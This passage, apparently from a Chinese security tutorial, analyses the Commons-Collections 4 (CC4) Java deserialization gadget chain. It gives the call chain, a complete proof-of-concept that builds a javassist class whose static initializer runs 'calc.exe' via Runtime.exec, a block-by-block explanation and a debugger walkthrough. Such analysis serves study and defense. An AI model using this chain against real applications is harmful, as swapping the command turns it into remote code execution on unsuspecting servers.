跟进，`_name`参数值为我们传入的`blckder02`，进入第二个if，`_class`参数值为null，`_bytecodes`参数值为用javassit创建的类的字节码；  
最后实例化`_class[_transletIndex]`，该参数的值就为`EvilCat606069074499600`  
执行static中的代码；  
命令执行成功；  
## CC4
### 前言
CC4相当于是CC2和CC3的结合，只要熟悉前面几条链了，这条链也就很容易看懂了；  
CC4和CC2一样是通过调用`TransformingComparator.compare()`来实现`transform()`的调用；  
和CC3一样是通过实例化`TrAXFilter`类，然后调用它的构造方法，进而实现`newTransformer()`的调用；
**环境搭建**
  * JDK 1.7
  * commons-collections 4.0
  * javassist 
`pom.xml`中添加：
                org.apache.commons
                commons-collections4
                4.0
                org.javassist
                javassist
                3.25.0-GA
                compile
**利用链**
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()
                PriorityQueue.siftDown()
                    PriorityQueue.siftDownUsingComparator()
                        TransformingComparator.compare()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InstantiateTransformer.transform()
                                newInstance()
                                    TrAXFilter#TrAXFilter()
                                    TemplatesImpl.newTransformer()
                                             TemplatesImpl.getTransletInstance()
                                             TemplatesImpl.defineTransletClasses
                                             newInstance()
                                                Runtime.exec()
### POC分析
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import javassist.*;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CC4 {
        public static void main(String[] args) throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            cc.writeFile();
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
            };
            ChainedTransformer transformerChain = new ChainedTransformer(transformers);
            TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
            PriorityQueue queue = new PriorityQueue(1);
            Object[] queue_array = new Object[]{templates,1};
            Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
            Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
            Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,Tcomparator);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
                outputStream.writeObject(queue);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }
**代码1**  
使用javassit创建一个类，这个类中包含static代码块，其中包含恶意命令执行代码，只要实例化这个类，就会执行static中的代码；  
最后把该类转换为字节码存到targetByteCodes数组中；
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    CtClass cc = pool.makeClass("Cat");
    String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
    cc.makeClassInitializer().insertBefore(cmd);
    String randomClassName = "EvilCat" + System.nanoTime();
    cc.setName(randomClassName);
    cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
    cc.writeFile();
    byte[] classBytes = cc.toBytecode();
    byte[][] targetByteCodes = new byte[][]{classBytes};
**代码2**  
实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因；
    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    setFieldValue(templates, "_bytecodes", targetByteCodes);
    setFieldValue(templates, "_name", "name");
    setFieldValue(templates, "_class", null);
**代码3**  
将`TrAXFilter.class`传给ConstantTransformer，那么就会返回`TrAXFilter`类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化`TrAXFilter`类，然而调用它的构造方法，进而调用`newTransformer()`方法，从而实现命令执行；
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
    };
    ChainedTransformer transformerChain = new ChainedTransformer(transformers);
**代码4**  
实例化一个TransformingComparator对象，将transformer传进去；  
实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null；
    TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
     PriorityQueue queue = new PriorityQueue(1);
**代码5**  
新建一个对象数组，第一个元素为templates，第二个元素为1；  
然后通过反射将该数组传到queue中；
    Object[] queue_array = new Object[]{templates,1};
    Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
**代码6**  
通过反射将queue的size设为2，因为在`PriorityQueue.heapify()`中，size的值需要大于1才能进入下一步；（CC2中有说到）
    Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
**代码7**  
通过反射给queue的comparator参数赋值，从而调用到`compare()`方法，实现`transform()`的调用；
    Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,Tcomparator);
### POC调试
还是从`PriorityQueue.readObject()`开始；  
`queue[]`里面是我们传入的TemplatesImpl类的实例化对象和整数1；  
跟进`heapify()`，size值为2；  
跟进`siftDown`，comparator参数不为null；  
跟进`siftDownUsingComparator`，调用了`compare()`；  
跟进`compare()`，`obj1`就是传入的templates，`this.transformer`是`ChainedTransformer`的实例化对象，也就是调用了`ChainedTransformer.transform()`；  
跟进`ChainedTransformer.transform()`，进入循坏；  
第一轮`iTransformer`参数值为ConstantTransformer，即调用了`ConstantTransformer.transform()`；  
跟进`ConstantTransformer.transform()`，`iConstant`参数值为传入的`TrAXFilter.class`，即返回了`TrAXFilter`类  
回到`ConstantTransformer.transform()`进入第二轮循环，这次的`iTransformer`参数值为InstantiateTransformer，`object`参数值为`TrAXFilter`；  
跟进`InstantiateTransformer.transform()`，返回`TrAXFilter`类对象；  
在实例化`TrAXFilter`类时，调用了它的构造方法，其中调用了`templates.newTransformer()`；  
后面就和CC2一样啦，到这里实例化了javassit新建类；  
命令执行成功；  
参考链接：  